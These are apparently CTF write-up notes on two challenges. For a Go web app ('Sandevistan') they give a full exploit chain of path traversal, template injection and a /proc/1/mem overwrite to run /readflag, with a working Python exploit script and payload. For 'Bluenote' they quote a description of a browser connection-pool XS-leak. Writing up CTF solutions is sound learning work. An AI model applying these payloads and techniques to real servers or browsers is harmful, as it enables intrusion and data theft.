## Sandevistan
Giving is a Go app and goal is to execute /redflag in the server

### Concerned source code snippets
```
func (s *Server) cwHandlePost(w http.ResponseWriter, r *http.Request){
    err := r.ParseForm()
    if err != nil {
        http.Error(w, err.Error(), http.StatusBadRequest)
        return
    }
    ue := checkForm(r)
 
    // The rest is left out because it's not important
}

func checkForm(r *http.Request) *models.UserError {
    var ue *models.UserError
    ctx := r.Context()
    username, exists := r.Form["username"]
    if !exists {
        ue = &models.UserError{
            Value: "NOUSER",
            Filename: "nouser",
            Ctx: ctx,
        }
        return ue
    }
    ctx = context.WithValue(ctx, "username", username[len(username)-1])
    cwName, exists := r.Form["name"]
    if !exists {
        ue = utils.ErrorFactory(ctx, "CyberWare name doesn't exist", username[len(username)-1])
        return ue
    }
    ue = utils.AlphaNumCheck(ctx, cwName[0])
    return ue
}

func AlphaNumCheck(ctx context.Context, t string) *models.UserError {
    if !regexp.MustCompile(`^[a-zA-Z0-9]*$`).MatchString(t) {
        v := fmt.Sprintf("ERROR! Invalid Value: %s\n", t)
        username := ctx.Value("username")
        regexErr := ErrorFactory(ctx, v, username.(string))
        return regexErr
    }
    return nil
}

func ErrorFactory(ctx context.Context, v string, f string) *models.UserError {
    filename := "errorlog/" + f
    UErr := &models.UserError{
        v,
        f,
        ctx,
    }
    file, _ := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)
    defer file.Close()

    file.WriteString(v)
    return UErr
}

func (s *Server) handleUserGet(w http.ResponseWriter, r *http.Request) {
    u, err := s.GetUser(r.FormValue("username"))
    if err != nil {
        http.Error(w, "Username not found", http.StatusNotFound)
        return
    }

    if u.Name == "NOUSER" {
        http.Redirect(w, r, "/", http.StatusFound)
    }
    utils.RenderTemplate(w, "/tmpl/user", u)
}

func (u *User) SerializeErrors(data string, index int, offset int64) error {
  fname := u.Errors[index]

    if fname == nil {
        return errors.New("Error not found")
    }
 
    f, err := os.OpenFile(fname.Filename, os.O_RDWR, 0)
    if err != nil {
        return errors.New("File not found")
    }
    defer f.Close()

    _, ferr := f.WriteAt([]byte(data), offset)
    if ferr != nil {
        return errors.New("File error writing")
    }

    return nil
}

func (u *User) UserHealthcheck() ([]byte, error) {
    cmd := exec.Command("/bin/true")  
    output, err := cmd.CombinedOutput()
    if err != nil {
        return nil, errors.New("error in healthcheck")
        panic(err)
    }
    return output, nil

}
```

- The ErrorFactory function has a path traversal vulnerability. You can overwrite any file using ErrorFactory through POST to /cyberware
- Overwrite /tmpl/user.html to do SSTI by sending a POST request with the parameter username=../tmpl/user.html&name=(payload) because it does not check if the user with the given username exists
- The handleUserGet function evaluates the template tmpl/user.html with the user object.
- Run SerializedErrors to overwrite /bin/true in /proc/1/mem
- Run UserHealthcheck to get the flag
```
import requests
# URL = "http://sandevistan.chal.perfect.blue:29005/"
URL = "http://localhost:1338/"

username = "user"

s = requests.session()
r = s.post(URL + "user", data={
    "username": username
})

r = s.post(URL + "cyberware", data={
    "username": "../tmpl/user.html",
    "name": '{{ .NewError "foo" "/proc/1/mem"  }} {{ .SerializeErrors "/readflag" 0 %d }} {{ .UserHealthcheck }}' % 0x93b6bb
})
r = s.get(URL + "user", params={
    "username": username
})
print(r.text)
```

ALTERNATE SOLUTION
![image](https://github.com/user-attachments/assets/a602ab0e-4322-4d83-899a-8a1c24073865)


## Bluenote
Couldnt find the actual chall but the writeups were something new i read
```
intended solution for bluenote was connection pool abuse yeah
if you block all the sockets, you can let individual blocks of requests go through if you unblock and reblock very quickly
so you block all the sockets, make your search guess, reblock quickly to let the page request through. so the search request is made, and now youre blocking the pool again 
then if your search is right, the page makes a request to dompurify, which should be blocked, and if the search is not right, there is no request 
then you make a request with lower priority than dompurify (i used script async), but higher priority than the background socket blocking fetches
then you allow one request through, if your script async went through there was nothing higher priority. if your script request did not go through, there mustve been something higher priority, meaning dompurify was loaded, meaning your search worked
```
